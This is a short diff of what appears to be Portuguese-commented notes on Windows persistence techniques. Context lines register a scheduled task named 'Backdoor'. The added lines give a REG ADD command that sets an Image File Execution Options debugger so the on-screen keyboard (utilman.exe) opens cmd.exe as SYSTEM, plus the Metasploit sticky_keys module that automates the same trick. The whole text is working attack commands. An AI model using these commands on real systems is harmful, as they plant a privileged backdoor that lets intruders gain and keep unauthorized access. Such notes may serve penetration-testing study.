@@ -58,4 +58,8 @@ PS > $E = New-ScheduledTask -Action $A -Trigger $B -Principal $C -Settings $D
 PS > Register-ScheduledTask Backdoor -InputObject $E
 
 
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f #Alterar registro do teclado virtual para abrir o cmd como NT AUTHORITY\SYSTEM 
+
+msfconsole
+use post windows/manage/sticky_keys #Faz exatamente o mesmo que o comando acima porém de forma automatizada pelo metasploit
 
